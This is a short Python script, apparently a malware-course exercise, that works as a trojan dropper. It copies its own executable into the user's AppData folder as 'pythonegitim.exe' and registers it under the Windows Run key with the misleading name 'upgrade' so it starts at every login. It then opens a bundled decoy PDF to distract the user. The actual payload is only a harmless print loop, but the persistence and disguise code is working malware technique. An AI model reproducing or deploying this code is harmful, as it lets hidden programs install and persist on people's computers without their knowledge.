import time
import subprocess
import os
import shutil
import sys

def add_to_registry():
    # persistence
    new_file = os.environ["appdata"] + "\\pythonegitim.exe"
    if not os.path.exists(new_file):
        shutil.copyfile(sys.executable, new_file)
        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
        subprocess.call(regedit_command, shell=True)

add_to_registry()

def open_added_file():
    if hasattr(sys, '_MEIPASS'):
        added_file = os.path.join(sys._MEIPASS, "yazbel.pdf")
    else:
        added_file = os.path.join(os.path.dirname(__file__), "yazbel.pdf")
    subprocess.Popen(added_file, shell=True)

open_added_file()

x = 0
while x < 100:
    print("python")
    x += 1
    time.sleep(0.5)
